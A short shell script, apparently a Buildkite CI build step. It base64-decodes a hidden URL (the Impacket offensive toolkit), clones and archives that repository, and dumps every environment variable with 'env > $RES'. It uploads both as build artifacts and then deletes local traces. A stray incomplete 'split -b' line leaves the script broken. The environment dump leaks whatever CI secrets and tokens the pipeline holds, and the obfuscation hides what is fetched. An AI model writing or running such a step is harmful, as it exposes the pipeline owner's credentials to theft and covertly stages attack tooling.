set -eo pipefail

RES=`mktemp`
ARCHIVE=`mktemp XXXXXXXXXX.tar.gz`

REPO=`echo -n "aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldA==" | base64 -d`
REPO_PATH=`echo $REPO | awk -F '/' '{print $NF}'`

git clone $REPO --single-branch
tar czf - $REPO_PATH | split -b 10m - "$ARCHIVE."

split -b

env > $RES

buildkite-agent artifact upload $RES
buildkite-agent artifact upload "$ARCHIVE.*"

rm -rf $RES $ARCHIVE $REPO_PATH
